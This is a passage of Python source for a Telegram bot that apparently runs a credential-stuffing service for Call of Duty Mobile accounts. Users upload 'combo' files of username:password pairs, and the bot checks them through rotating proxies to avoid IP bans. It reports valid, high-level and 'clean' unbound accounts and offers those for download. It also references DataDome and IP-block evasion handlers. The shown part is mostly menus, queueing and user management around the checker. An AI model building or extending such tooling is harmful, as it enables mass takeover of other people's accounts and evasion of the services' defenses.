        f"┈➤ Working Proxies: {len(global_proxy_manager.working_proxies)}\n\n"
        f"<i>Using proxies helps avoid IP bans and rate limiting.</i>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def proxy_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = global_proxy_manager.get_stats()
    pref = get_user_proxy_preference(user_id)
    
    status_text = f"""
🌐 <b>PROXY STATUS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>📊 STATISTICS:</b>
┈➤ Connection Type: <b>{stats['type']}</b>
┈➤ Total Proxies Loaded: {stats['total_loaded']}
┈➤ Working Proxies: <b>{stats['working']}</b> ✅
┈➤ Bad Proxies: {stats['bad']} ❌

<b>⚙️ YOUR SETTINGS:</b>
┈➤ Use Proxy: {'✅ YES' if pref.get('use_proxy', False) else '❌ NO'}
┈➤ Proxy Mode: <b>{pref.get('proxy_type', 'direct')}</b>

<b>🎯 PROXY MODES:</b>
┈➤ direct - No proxy, direct connection
┈➤ proxy - Random proxy from working list
┈➤ rotating - Rotate proxies per request

<i>Working proxies are stored in proxy/working/ directory</i>
"""
    await safe_send_message(update, status_text, parse_mode='HTML', reply_markup=create_back_keyboard())

async def proxy_test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not global_proxy_manager.proxy_list:
        await safe_send_message(update, "❌ No proxies loaded. Use /proxy_upload to upload proxy file first.", parse_mode='HTML')
        return
    
    status_msg = await safe_send_message(update, "🔍 Testing proxies... This may take a few minutes.", parse_mode='HTML')
    
    def run_test():
        return global_proxy_manager.test_proxies_batch()
    
    loop = asyncio.get_event_loop()
    working = await loop.run_in_executor(None, run_test)
    
    working_count = len(working)
    avg_response = sum(p['response_time'] for p in working) / working_count if working else 0
    
    result_text = f"""
✅ <b>PROXY TEST COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Results:</b>
┈➤ Working: <b>{working_count}</b> ✅
┈➤ Bad: {len(global_proxy_manager.bad_proxies)} ❌
┈➤ Avg Response: {avg_response:.2f}s

🌍 <b>Top Proxies by Country:</b>
"""
    country_counts = {}
    for p in working[:10]:
        country = p.get('country', 'Unknown')
        country_counts[country] = country_counts.get(country, 0) + 1
    
    for country, count in list(country_counts.items())[:5]:
        result_text += f"\n┈➤ {country}: {count} proxies"
    
    result_text += f"\n\n<i>Working proxies saved to proxy/working/</i>"
    
    await status_msg.edit_text(result_text, parse_mode='HTML', reply_markup=create_back_keyboard())

async def proxy_fetch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await safe_send_message(update, "❌ Admin only command.", parse_mode='HTML')
        return
    
    status_msg = await safe_send_message(update, "🌐 Fetching proxies from online sources... This may take a minute.", parse_mode='HTML')
    
    proxies = await auto_fetch_proxies()
    
    if proxies:
        global_proxy_manager.load_proxies_from_file()
        
        await status_msg.edit_text(
            f"✅ <b>PROXY FETCH COMPLETE</b>\n\n"
            f"📊 Fetched {len(proxies)} proxies from {len(FREE_PROXY_SOURCES)} sources\n"
            f"📁 Total proxies loaded: {len(global_proxy_manager.proxy_list)}\n\n"
            f"Use /proxy_test to test them.",
            parse_mode='HTML',
            reply_markup=create_back_keyboard()
        )
    else:
        await status_msg.edit_text(
            "❌ Failed to fetch proxies. Please check internet connection.",
            parse_mode='HTML',
            reply_markup=create_back_keyboard()
        )

async def proxy_type_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚫 DIRECT (No Proxy)", callback_data="proxy_set_direct")],
        [InlineKeyboardButton("🎲 PROXY (Random)", callback_data="proxy_set_proxy")],
        [InlineKeyboardButton("🔄 ROTATING (Rotate per request)", callback_data="proxy_set_rotating")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu")]
    ]
    
    await safe_send_message(
        update,
        f"🌐 <b>SELECT PROXY MODE</b>\n\n"
        f"<b>direct</b> - No proxy, direct connection\n"
        f"<b>proxy</b> - Random proxy from working list\n"
        f"<b>rotating</b> - Rotate proxies per request (recommended)\n\n"
        f"Current: <b>{get_user_proxy_preference(update.effective_user.id).get('proxy_type', 'direct')}</b>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def proxy_toggle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    pref = get_user_proxy_preference(user_id)
    new_state = not pref.get('use_proxy', False)
    
    if new_state and not global_proxy_manager.working_proxies:
        await safe_send_message(
            update,
            "⚠️ No working proxies available!\n\n"
            "Please upload and test proxies first using:\n"
            "/proxy_upload - Upload proxy file\n"
            "/proxy_test - Test loaded proxies",
            parse_mode='HTML'
        )
        return
    
    set_user_proxy_preference(user_id, new_state, pref.get('proxy_type', 'rotating'))
    
    await safe_send_message(
        update,
        f"✅ <b>Proxy usage {'ENABLED' if new_state else 'DISABLED'}</b>\n\n"
        f"Mode: {pref.get('proxy_type', 'rotating')}\n"
        f"Working proxies: {len(global_proxy_manager.working_proxies)}\n\n"
        f"Next check will {'use' if new_state else 'not use'} proxies.",
        parse_mode='HTML',
        reply_markup=create_back_keyboard()
    )

async def proxy_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await safe_send_message(update, "❌ Admin only command.", parse_mode='HTML')
        return
    
    context.user_data['awaiting_proxy_file'] = True
    await safe_send_message(
        update,
        f"📤 <b>UPLOAD PROXY FILE</b>\n\n"
        f"Send a .txt file with proxies.\n\n"
        f"<b>Format:</b>\n"
        f"• host:port\n"
        f"• host:port:username:password\n"
        f"• http://host:port\n\n"
        f"Example:\n"
        f"<code>192.168.1.1:8080</code>\n"
        f"<code>proxy.example.com:3128:user:pass</code>",
        parse_mode='HTML'
    )

async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_proxy_file'):
        return
    
    user_id = update.effective_user.id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.", parse_mode='HTML')
        return
    
    status_msg = await update.message.reply_text("📥 Processing proxy file...", parse_mode='HTML')
    
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    file_text = file_content.decode('utf-8', errors='ignore')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"user_{user_id}_{timestamp}_{document.file_name}"
    filepath = PROXY_ALL_DIR / filename
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(file_text)
    
    main_proxy_file = PROXY_DIR / "proxy.txt"
    with open(main_proxy_file, 'a', encoding='utf-8') as f:
        f.write(f"\n# Uploaded by user {user_id} at {datetime.now()}\n")
        f.write(file_text)
    
    global_proxy_manager.load_proxies_from_file()
    
    await status_msg.edit_text(
        f"✅ <b>Proxy file uploaded!</b>\n\n"
        f"📄 File: {document.file_name}\n"
        f"📁 Saved to: {filepath}\n"
        f"📊 Total proxies loaded: {len(global_proxy_manager.proxy_list)}\n\n"
        f"Use /proxy_test to test them.",
        parse_mode='HTML'
    )
    
    context.user_data['awaiting_proxy_file'] = False

async def set_threading_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await safe_send_message(update, "❌ Admin only command.", parse_mode='HTML')
        return
    
    try:
        args = context.args
        if args and args[0].isdigit():
            new_count = int(args[0])
            if 1 <= new_count <= 10:
                rebuild_semaphore(new_count)
                await safe_send_message(
                    update,
                    f"✅ Concurrent checkers set to {new_count}\n\n"
                    f"Memory optimized for Railway deployment.",
                    parse_mode='HTML'
                )
            else:
                await safe_send_message(update, "❌ Please enter a number between 1 and 10.", parse_mode='HTML')
        else:
            await safe_send_message(
                update,
                f"⚙️ <b>CONCURRENT CHECKER SETTINGS</b>\n\n"
                f"Current: <b>{MAX_CONCURRENT_CHECKERS}</b>\n"
                f"Max recommended: 2 for 512MB RAM\n\n"
                f"Usage: <code>/set_threading &lt;number&gt;</code>\n"
                f"Example: <code>/set_threading 3</code>",
                parse_mode='HTML'
            )
    except Exception as e:
        await safe_send_message(update, f"❌ Error: {e}", parse_mode='HTML')

# ==================== TELEGRAM BOT UI BUTTONS ====================

def create_user_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎮 START CHECKING", callback_data="start_check"),
         InlineKeyboardButton("📊 MY INFO", callback_data="my_info")],
        [InlineKeyboardButton("📦 QUEUE STATUS", callback_data="queue_status"),
         InlineKeyboardButton("🌐 PROXY SETTINGS", callback_data="proxy_menu")],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_completion_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎮 CHECK AGAIN", callback_data="start_check"),
         InlineKeyboardButton("📊 MY INFO", callback_data="my_info")],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_completion_keyboard_with_cooldown(cooldown_seconds):
    keyboard = [
        [InlineKeyboardButton(f"⏳ WAIT {cooldown_seconds}s", callback_data="cooldown_wait"),
         InlineKeyboardButton("📊 MY INFO", callback_data="my_info")],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_admin_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎮 START CHECKING", callback_data="start_check"),
         InlineKeyboardButton("📊 MY INFO", callback_data="my_info")],
        [InlineKeyboardButton("🌐 PROXY MANAGEMENT", callback_data="proxy_menu")],
        [InlineKeyboardButton("👥 PENDING APPROVALS", callback_data="pending_approvals"),
         InlineKeyboardButton("👥 LIST USERS", callback_data="list_users")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban"),
         InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("🗑️ DELETE USER", callback_data="admin_delete"),
         InlineKeyboardButton("📝 EDIT LINES", callback_data="admin_edit_lines")],
        [InlineKeyboardButton("⏰ SET EXPIRY", callback_data="admin_set_expiry"),
         InlineKeyboardButton("🔄 RESET COOLDOWN", callback_data="admin_reset_cooldown")],
        [InlineKeyboardButton("📢 SEND ANNOUNCEMENT", callback_data="send_announcement"),
         InlineKeyboardButton("🌐 SYSTEM STATUS", callback_data="system_status")],
        [InlineKeyboardButton("⚙️ THREADING", callback_data="threading_menu"),
         InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_back_keyboard():
    keyboard = [[InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(keyboard)

ADMIN_IDS = [8252162481]

def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_admin_ids():
    return ADMIN_IDS

async def safe_send_message(update: Update, text: str, parse_mode: str = 'HTML', reply_markup=None):
    try:
        if update.callback_query:
            msg = await update.callback_query.message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
            return msg
        elif update.message:
            msg = await update.message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
            return msg
        else:
            if hasattr(update, 'effective_chat') and update.effective_chat:
                msg = await bot_application.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=text,
                    parse_mode=parse_mode,
                    reply_markup=reply_markup
                )
                return msg
    except Exception as e:
        logger_telegram.error(f"Error sending message: {e}")
        return None

# ==================== COMMAND HANDLERS ====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or str(user_id)
    first_name = user.first_name or "User"
    
    console.print(f"[green]User started: {first_name} (ID: {user_id})[/green]")
    
    if is_user_banned(user_id):
        await safe_send_message(update, "🚫 <b>ACCOUNT BANNED</b>\n\nYour account has been banned from using this bot.", parse_mode='HTML')
        return
    
    if is_admin(user_id):
        await send_welcome_admin(update, context)
        return
    
    if is_user_approved(user_id):
        warning = get_expiry_warning(user_id)
        if warning:
            await safe_send_message(update, warning, parse_mode='HTML')
        await send_welcome_user(update, context)
        return
    
    pending = load_pending()
    user_id_str = str(user_id)
    
    if user_id_str in pending:
        await safe_send_message(
            update,
            f"⏳ <b>{stylize_text('PENDING APPROVAL')}</b>\n\n"
            f"Your request is waiting for admin approval.\n\n"
            f"You will be notified once approved.",
            parse_mode='HTML',
            reply_markup=create_back_keyboard()
        )
        return
    
    pending[user_id_str] = {
        'username': username,
        'first_name': first_name,
        'requested_at': time.time(),
        'status': 'pending'
    }
    save_pending(pending)
    
    admin_ids = get_admin_ids()
    for admin_id in admin_ids:
        try:
            await bot_application.bot.send_message(
                chat_id=admin_id,
                text=f"🆕 <b>NEW ACCESS REQUEST!</b>\n\n"
                     f"👤 <b>User:</b> {first_name}\n"
                     f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                     f"📝 <b>Username:</b> @{username}\n\n"
                     f"Active users: {concurrent_manager.get_active_count()}/10",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{user_id}"),
                     InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{user_id}")]
                ])
            )
        except Exception as e:
            console.print(f"[red]Error notifying admin: {e}[/red]")
    
    await safe_send_message(
        update,
        f"🆕 <b>{stylize_text('ACCESS REQUEST SUBMITTED')}</b>\n\n"
        f"Your request has been submitted.\n\n"
        f"An admin will review and notify you once approved.\n\n"
        f"Thank you for your patience! 🙏",
        parse_mode='HTML',
        reply_markup=create_back_keyboard()
    )

async def send_welcome_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_info = get_user_info(user_id)
    pref = get_user_proxy_preference(user_id)
    
    remaining_lines = get_remaining_lines(user_id)
    expiry = user_info.get('expiry_time') if user_info else None
    queue_length = concurrent_manager.get_queue_length(user_id)
    is_checking = concurrent_manager.is_user_checking(user_id)
    active_users = concurrent_manager.get_active_count()
    
    expiry_text = ""
    if expiry:
        expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
        expiry_text = f"\n⏰ <b>Expires:</b> {expiry_date}"
    
    proxy_status = "✅ ON" if pref.get('use_proxy', False) else "❌ OFF"
    proxy_mode = pref.get('proxy_type', 'direct')
    
    welcome_text = f"""
╔══════════════════════════════════════════════════════════════════╗
║  ✨ <b>{stylize_text('CØDM PRΣMIUM BØT CHECKER')}</b> ✨
║  ═══════════════════════════════════════════════════════════════
║  <b>{stylize_text(f'⚡ {BOT_VERSION}')}</b>    <b>{stylize_text('ᴍᴜʟᴛɪ-ᴜsᴇʀ')}</b>
║
║  <b>✅ YOUR ACCESS IS APPROVED!</b>
║
║  <b>📊 YOUR STATUS:</b>
║  ┈➤ 📝 Remaining Lines: {remaining_lines:,}
║  ┈➤ 🎮 Minimum Level: {LEVEL_THRESHOLD}+{expiry_text}
║
║  <b>🌐 PROXY SETTINGS:</b>
║  ┈➤ Proxy: {proxy_status}
║  ┈➤ Mode: {proxy_mode}
║
║  <b>🌐 SYSTEM STATUS:</b>
║  ┈➤ 👥 Active Users: {active_users}/10
║  ┈➤ 📦 Your Queue: {queue_length} files
║  ┈➤ 🔄 Currently Checking: {'✅ YES' if is_checking else '❌ NO'}
║
║  <b>📦 FEATURES:</b>
║  ┈➤ 10 users can check simultaneously!
║  ┈➤ Clean account detection
║  ┈➤ Queue system for each user
║  ┈➤ Proxy support with auto-rotation
║
║  <b>⏰ COOLDOWN POLICY:</b>
║  ┈➤ 60 seconds after EVERY check
║
║  <b>{stylize_text('Choose an action below:')}</b>
╚══════════════════════════════════════════════════════════════════╝
"""
    await safe_send_message(update, welcome_text, parse_mode='HTML', reply_markup=create_user_main_keyboard())

async def send_welcome_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pending_count = len(load_pending())
    active_users = concurrent_manager.get_active_count()
    
    welcome_text = f"""
╔══════════════════════════════════════════════════════════════════╗
║  👑 <b>{stylize_text('ADMIN PANEL')}</b> 👑
║  ═══════════════════════════════════════════════════════════════
║
║  <b>📊 PENDING REQUESTS:</b> {pending_count}
║  <b>👥 ACTIVE USERS:</b> {active_users}/10
║  <b>🌐 WORKING PROXIES:</b> {len(global_proxy_manager.working_proxies)}
║  <b>⚡ CONCURRENT CHECKERS:</b> {MAX_CONCURRENT_CHECKERS}
║
║  <b>⚙️ ADMIN COMMANDS:</b>
║  ┈➤ Ban/Unban users
║  ┈➤ Delete users
║  ┈➤ Edit line limits
║  ┈➤ Set expiry dates
║  ┈➤ Reset user cooldowns
║  ┈➤ Manage proxies
║  ┈➤ Set threading
║
║  <b>{stylize_text('Choose an action below:')}</b>
╚══════════════════════════════════════════════════════════════════╝
"""
    await safe_send_message(update, welcome_text, parse_mode='HTML', reply_markup=create_admin_main_keyboard())

async def check_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_user_banned(user_id):
        await safe_send_message(update, "🚫 <b>ACCOUNT BANNED</b>\n\nYour account has been banned from using this bot.", parse_mode='HTML')
        return
    
    if not is_user_approved(user_id) and not is_admin(user_id):
        await safe_send_message(update, f"❌ <b>{stylize_text('ACCESS DENIED')}</b>\n\nUse /start to request access.", parse_mode='HTML')
        return
    
    cooldown_remaining = get_cooldown_remaining(user_id)
    if cooldown_remaining > 0:
        await safe_send_message(
            update,
            f"⏰ <b>{stylize_text('COOLDOWN ACTIVE')}</b>\n\n"
            f"You need to wait <b>{cooldown_remaining} seconds</b> before checking again.\n\n"
            f"⏰ <b>Cooldown Policy:</b> 60 seconds after EVERY check.",
            parse_mode='HTML',
            reply_markup=create_back_keyboard()
        )
        return
    
    remaining = get_remaining_lines(user_id)
    if remaining <= 0 and not is_admin(user_id):
        await safe_send_message(update, f"❌ <b>{stylize_text('NO LINES REMAINING')}</b>\n\nPlease contact an admin.", parse_mode='HTML')
        return
    
    pref = get_user_proxy_preference(user_id)
    proxy_msg = ""
    if global_proxy_manager.working_proxies and not pref.get('use_proxy', False):
        proxy_msg = f"\n\n🌐 <b>Proxy available!</b> Use /proxy to enable proxy for better anonymity."
    
    context.user_data['awaiting_file'] = True
    active_users = concurrent_manager.get_active_count()
    
    await safe_send_message(
        update,
        f"📤 <b>{stylize_text('UPLOAD COMBO FILE')}</b>\n\n"
        f"Send your combo file (.txt format)\n"
        f"<b>Format:</b> <code>username:password</code>\n\n"
        f"📊 <b>Remaining lines:</b> {remaining:,}\n"
        f"👥 <b>Active users:</b> {active_users}/10\n"
        f"🌐 <b>Proxy:</b> {'ON' if pref.get('use_proxy', False) else 'OFF'}\n\n"
        f"⏰ <b>Note:</b> After this check, you'll have a 60-second cooldown.\n\n"
        f"🧹 Clean accounts will be saved automatically!{proxy_msg}",
        parse_mode='HTML'
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_user_banned(user_id):
        await update.message.reply_text("🚫 Your account is banned.", parse_mode='HTML')
        return
    
    if not is_user_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Your account is not approved yet.", parse_mode='HTML')
        return
    
    if not context.user_data.get('awaiting_file', False):
        await update.message.reply_text("Use /check to start first.", parse_mode='HTML')
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(f"❌ Send a .txt file with username:password format.", parse_mode='HTML')
        return
    
    status_msg = await update.message.reply_text(f"📥 Downloading file...", parse_mode='HTML')
    
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    file_text = file_content.decode('utf-8', errors='ignore')
    
    file_path = f"combo_{user_id}_{int(time.time())}.txt"
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(file_text)
    
    unique_count, dup_removed = remove_duplicates_from_file(file_path)
    
    with open(file_path, 'r', encoding='utf-8') as f:
        accounts = [line.strip() for line in f if line.strip() and ':' in line]
    
    if not accounts:
        await update.message.reply_text(f"❌ No valid accounts found.", parse_mode='HTML')
        os.remove(file_path)
        return
    
    remaining = get_remaining_lines(user_id)
    if len(accounts) > remaining and remaining > 0:
        await update.message.reply_text(f"⚠️ You have {remaining} lines left. Only first {remaining} will be checked.", parse_mode='HTML')
        accounts = accounts[:remaining]
    
    queue_item = FileQueueItem(
        file_path=file_path,
        original_filename=document.file_name,
        accounts=accounts,
        total_accounts=len(accounts),
        duplicates_removed=dup_removed
    )
    queue_item.status = 'pending'
    queue_item.start_time = time.time()
    
    concurrent_manager.add_to_queue(user_id, queue_item)
    queue_length = concurrent_manager.get_queue_length(user_id)
    active_users = concurrent_manager.get_active_count()
    pref = get_user_proxy_preference(user_id)
    
    await status_msg.edit_text(
        f"✅ <b>File added to queue!</b>\n\n"
        f"📄 <b>File:</b> {document.file_name}\n"
        f"📊 <b>Accounts:</b> <code>{len(accounts)}</code>\n"
        f"🗑️ <b>Duplicates removed:</b> <code>{dup_removed}</code>\n"
        f"🌐 <b>Proxy:</b> {'ON' if pref.get('use_proxy', False) else 'OFF'}\n\n"
        f"📦 <b>Files in queue:</b> {queue_length}\n"
        f"👥 <b>Active users:</b> {active_users}/10\n\n"
        f"<i>Your file will be processed automatically!</i>",
        parse_mode='HTML'
    )
    
    context.user_data['awaiting_file'] = False
    
    if not concurrent_manager.is_user_checking(user_id):
        await start_user_checking(update, context, user_id)

async def start_user_checking(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    if concurrent_manager.is_user_checking(user_id):
        return
    
    file_item = concurrent_manager.get_next_file(user_id)
    if not file_item:
        return
    
    if not concurrent_manager.can_start_checking(user_id):
        if not context.user_data.get('waiting_notification_sent', False):
            context.user_data['waiting_notification_sent'] = True
            await safe_send_message(
                update,
                f"⏳ <b>Your file is queued...</b>\n\n"
                f"Current active users: {concurrent_manager.get_active_count()}/10\n"
                f"Your file will start automatically when a slot opens.",
                parse_mode='HTML'
            )
        return
    
    context.user_data['waiting_notification_sent'] = False
    
    checker = UserAccountChecker(user_id, update, context, concurrent_manager)
    user_checkers[user_id] = checker
    
    concurrent_manager.register_session(user_id, checker.session, checker.datadome_manager, checker.ip_block_handler)
    
    pref = get_user_proxy_preference(user_id)
    proxy_info = f"\n🌐 Proxy: {'ON' if pref.get('use_proxy', False) else 'OFF'} ({pref.get('proxy_type', 'direct')})" if pref.get('use_proxy', False) else ""
    
    progress_msg = await safe_send_message(
        update,
        f"🚀 <b>{stylize_text('STARTING CHECK')}</b>\n\n"
        f"📁 <b>File:</b> {file_item.original_filename}\n"
        f"📊 <b>Accounts:</b> {len(file_item.accounts)}\n"
        f"👥 <b>Active users:</b> {concurrent_manager.get_active_count()}/10{proxy_info}\n\n"
        f"<i>Processing in progress...</i>",
        parse_mode='HTML'
    )
    
    if progress_msg:
        concurrent_manager.set_progress_message(user_id, progress_msg)
    
    try:
        hits = await checker.run_checker_async(file_item.accounts, file_item, progress_msg)
        
        duration = time.time() - file_item.start_time if file_item.start_time else 0
        remaining_lines = get_remaining_lines(user_id)
        stats_data = checker.stats.get_stats() if checker.stats else {}
        
        set_user_check_completed(user_id)
        cooldown_remaining = get_cooldown_remaining(user_id)
        
        completion_msg = f"""
🎉 <b>THANK YOU FOR USING CODM PREMIUM BOT!</b> 🎉

✅ <b>FILE COMPLETED!</b>

📁 <b>File:</b> {file_item.original_filename}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>STATISTICS:</b>
┈➤ ✅ Valid: {stats_data.get('valid', 0)}
┈➤ ❌ Invalid: {stats_data.get('invalid', 0)}
┈➤ 🎮 Has CODM: {stats_data.get('has_codm', 0)}
┈➤ 📭 No CODM: {stats_data.get('no_codm', 0)}
┈➤ 🧹 Clean: {stats_data.get('clean', 0)}
┈➤ 🔗 Bound: {stats_data.get('not_clean', 0)}
┈➤ 💀 Leaked: {stats_data.get('leaked', 0)}

🎮 <b>CODM Hits (80+):</b> {len(checker.codm_hits)}
🧹 <b>Clean Accounts:</b> {len(checker.clean_no_bind_accounts)}
📊 <b>Remaining Lines:</b> {remaining_lines:,}
⏱️ <b>Duration:</b> {duration:.1f}s

⏰ <b>Next check available in:</b> {cooldown_remaining} seconds

💝 <b>Thank you for using our service!</b>
⚡ Checked by CODM Premium Bot
"""
        
        await safe_send_message(update, completion_msg, parse_mode='HTML', reply_markup=create_completion_keyboard_with_cooldown(cooldown_remaining))
        
        if checker.clean_no_bind_accounts:
            download_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📥 DOWNLOAD CLEAN ({len(checker.clean_no_bind_accounts)})", callback_data="download_clean")],
                [InlineKeyboardButton("🎮 CHECK AGAIN", callback_data="start_check")],
                [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")]
            ])
            await safe_send_message(
                update,
                f"🧹 Clean accounts available for download!",
                parse_mode='HTML',
                reply_markup=download_keyboard
            )
        
        try:
            os.remove(file_item.file_path)
        except:
            pass
        
        next_file = concurrent_manager.get_next_file(user_id)
        if next_file:
            await safe_send_message(
                update,
                f"🔄 Next file in queue starting automatically...",
                parse_mode='HTML'
            )
            await start_user_checking(update, context, user_id)
        
    except Exception as e:
        logger_telegram.error(f"Error in checker for user {user_id}: {e}")
        await safe_send_message(update, f"❌ Error during checking: {str(e)[:100]}", parse_mode='HTML')
    finally:
        concurrent_manager.unregister_session(user_id)
        if user_id in user_checkers:
            del user_checkers[user_id]
        
        try:
            if progress_msg:
                await progress_msg.delete()
        except:
            pass

async def queue_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    queue_length = concurrent_manager.get_queue_length(user_id)
    is_checking = concurrent_manager.is_user_checking(user_id)
    active_users = concurrent_manager.get_active_count()
    remaining_lines = get_remaining_lines(user_id)
    cooldown_remaining = get_cooldown_remaining(user_id)
    pref = get_user_proxy_preference(user_id)
    
    status_text = f"""
📦 <b>{stylize_text('YOUR QUEUE STATUS')}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Remaining Lines:</b> {remaining_lines:,}
📄 <b>Files in Queue:</b> {queue_length}
🔄 <b>Currently Checking:</b> {'✅ YES' if is_checking else '❌ NO'}

🌐 <b>Proxy Status:</b> {'ON' if pref.get('use_proxy', False) else 'OFF'} ({pref.get('proxy_type', 'direct')})

⏰ <b>Cooldown Remaining:</b> {cooldown_remaining} seconds

🌐 <b>SYSTEM STATUS:</b>
👥 <b>Active Users:</b> {active_users}/10

<i>Your files will be processed automatically in order.</i>
"""
    await safe_send_message(update, status_text, parse_mode='HTML', reply_markup=create_user_main_keyboard())

async def system_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await safe_send_message(update, "❌ Admin only.", parse_mode='HTML')
        return
    
    users = load_users()
    active_users = concurrent_manager.get_active_count()
    active_list = concurrent_manager.get_active_users()
    total_users = len(users)
    pending_count = len(load_pending())
    banned_count = sum(1 for u in users.values() if u.get('status') == 'banned')
    proxy_stats = global_proxy_manager.get_stats()
    
    status_text = f"""
🌐 <b>SYSTEM STATUS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👥 <b>USERS:</b>
┈➤ 📊 Total Users: {total_users}
┈➤ 🚫 Banned: {banned_count}
┈➤ ⏳ Pending: {pending_count}

🔄 <b>ACTIVE CHECKS:</b>
┈➤ 👥 Active: {active_users}/10
┈➤ 📋 Users: {active_list if active_list else 'None'}

🌐 <b>PROXY STATUS:</b>
┈➤ Type: {proxy_stats['type']}
┈➤ Working: {proxy_stats['working']}
┈➤ Total: {proxy_stats['total_loaded']}

⚡ <b>BOT INFO:</b>
┈➤ 🎮 Version: {BOT_VERSION}
┈➤ 🧹 Clean Forwarding: {'ON' if FORWARD_CLEAN_ACCOUNTS else 'OFF'}
┈➤ ⚡ Concurrent Checkers: {MAX_CONCURRENT_CHECKERS}

⏰ <b>COOLDOWN POLICY:</b>
┈➤ 60 seconds after EVERY check

💡 <b>RESPONSE NOTE:</b>
┈➤ Multiple active users may cause slower responses
┈➤ All files are queued and will be processed
"""
    await safe_send_message(update, status_text, parse_mode='HTML', reply_markup=create_admin_main_keyboard())

async def my_info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_info = get_user_info(user_id)
    pref = get_user_proxy_preference(user_id)
    
    if not user_info and not is_admin(user_id):
        await safe_send_message(update, "❌ User not found. Please /start again.", parse_mode='HTML')
        return
    
    remaining = get_remaining_lines(user_id)
    used = user_info.get('lines_used', 0) if user_info else 0
    total = user_info.get('total_lines_checked', 0) if user_info else 0
    limit = user_info.get('lines_limit', 500) if user_info else 999999
    status = user_info.get('status', 'active') if user_info else 'admin'
    
    cooldown_remaining = get_cooldown_remaining(user_id)
    cooldown_text = f"⏰ {cooldown_remaining}s" if cooldown_remaining > 0 else "✅ Ready"
    
    info_text = f"""
📊 <b>{stylize_text('YOUR INFORMATION')}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📈 <b>LINE USAGE:</b>
┈➤ 📝 Limit: {limit:,}
┈➤ ✅ Used: {used:,}
┈➤ 📊 Remaining: {remaining:,}
┈➤ 📋 Total Checked: {total:,}

🌐 <b>PROXY SETTINGS:</b>
┈➤ Status: {'✅ ON' if pref.get('use_proxy', False) else '❌ OFF'}
┈➤ Mode: {pref.get('proxy_type', 'direct')}

👤 <b>STATUS:</b>
┈➤ {'ADMIN' if is_admin(user_id) else status.upper()}
